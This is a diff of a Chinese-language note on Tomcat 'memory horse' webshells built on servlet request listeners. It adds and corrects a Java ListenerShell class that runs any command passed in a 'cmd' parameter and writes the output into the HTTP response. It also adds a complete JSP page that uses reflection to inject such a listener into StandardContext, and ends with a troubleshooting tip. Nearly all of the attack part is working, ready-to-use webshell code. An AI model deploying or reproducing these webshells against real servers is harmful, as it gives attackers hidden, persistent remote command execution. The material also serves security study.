@@ -186,19 +186,25 @@ public boolean fireRequestInitEvent(ServletRequest request) {
 
 ```java
 public class ListenerShell implements ServletRequestListener {  
+    @Override  
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
         HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();  
         if (req.getParameter("cmd") != null) {  
+            InputStream in = null;  
             try {  
-                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
+                System.out.println("do some bad bad");  
+                in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
                 Scanner s = new Scanner(in).useDelimiter("\\A");  
-                String out = s.hasNext() ? s.next() : "";  
+                String output = s.hasNext() ? s.next() : "";  
                 Field requestF = req.getClass().getDeclaredField("request");  
                 requestF.setAccessible(true);  
                 Request request = (Request) requestF.get(req);  
-                request.getResponse().getWriter().write(out);  
-            } catch (IOException | NoSuchFieldException | IllegalAccessException e) {}  
-        }    }}
+                request.getResponse().getWriter().write(output);  
+            } catch (IOException | NoSuchFieldException | IllegalAccessException ignored) {}  
+        }    }    @Override  
+    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {  
+  
+    }}
 ```
 
 获取standardcontext并`getApplicationEventListeners()`
@@ -208,8 +214,76 @@ Field reqField = request.getClass().getDeclaredField("request");
 reqField.setAccessible(true);  
 Request req = (Request) reqField.get(request);  
 StandardContext context = (StandardContext) req.getContext();  
-context.fireRequestInitEvent(req.getRequest());  
 ListenerShell listenerShell = new ListenerShell();  
-context.addApplicationListener(String.valueOf(listenerShell));
+context.addApplicationEventListener(listenerShell);
 ```
 
+ Drun1baby师傅的写法，为什么不zha
+ 
+```jsp
+<%@ page import="org.apache.catalina.core.StandardContext" %>  
+<%@ page import="java.util.List" %>  
+<%@ page import="java.util.Arrays" %>  
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
+<%@ page import="java.lang.reflect.Field" %>  
+<%@ page import="java.util.ArrayList" %>  
+<%@ page import="java.io.InputStream" %>  
+<%@ page import="org.apache.catalina.connector.Request" %>  
+<%@ page import="org.apache.catalina.connector.Response" %>  
+<%!  
+  
+    class ListenerMemShell implements ServletRequestListener {  
+  
+        @Override  
+        public void requestInitialized(ServletRequestEvent sre) {  
+            String cmd;  
+            try {  
+                cmd = sre.getServletRequest().getParameter("cmd");  
+                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  
+                Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");  
+                requestField.setAccessible(true);  
+                Request request = (Request) requestField.get(requestFacade);  
+                Response response = request.getResponse();  
+  
+                if (cmd != null){  
+                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
+                    int i = 0;  
+                    byte[] bytes = new byte[1024];  
+                    while ((i=inputStream.read(bytes)) != -1){  
+                        response.getWriter().write(new String(bytes,0,i));  
+                        response.getWriter().write("\r\n");  
+                    }  
+                }  
+            }catch (Exception e){  
+                e.printStackTrace();  
+            }  
+        }  
+  
+        @Override  
+        public void requestDestroyed(ServletRequestEvent sre) {  
+        }  
+    }  
+%>  
+  
+<%  
+    ServletContext servletContext =  request.getServletContext();  
+    Field applicationContextField = servletContext.getClass().getDeclaredField("context");  
+    applicationContextField.setAccessible(true);  
+    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  
+  
+    Field standardContextField = applicationContext.getClass().getDeclaredField("context");  
+    standardContextField.setAccessible(true);  
+    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);  
+  
+    Object[] objects = standardContext.getApplicationEventListeners();  
+    List<Object> listeners = Arrays.asList(objects);  
+    List<Object> arrayList = new ArrayList(listeners);  
+    arrayList.add(new ListenerMemShell());  
+    standardContext.setApplicationEventListeners(arrayList.toArray());  
+  
+%>
+```
+
+
+## 总结&踩坑
+在写jsp的马的时候需要完成从创建到销毁整个过程，否则是无法完成所接入的类的
